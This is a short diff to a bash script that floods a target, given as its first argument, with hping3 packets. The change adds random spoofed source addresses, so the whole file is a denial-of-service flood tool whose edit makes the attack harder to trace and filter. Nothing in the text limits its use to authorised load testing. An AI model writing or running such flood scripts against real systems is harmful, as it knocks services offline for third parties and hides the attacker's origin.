@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo hping3 --flood $1
+sudo hping3 --flood --rand-source $1
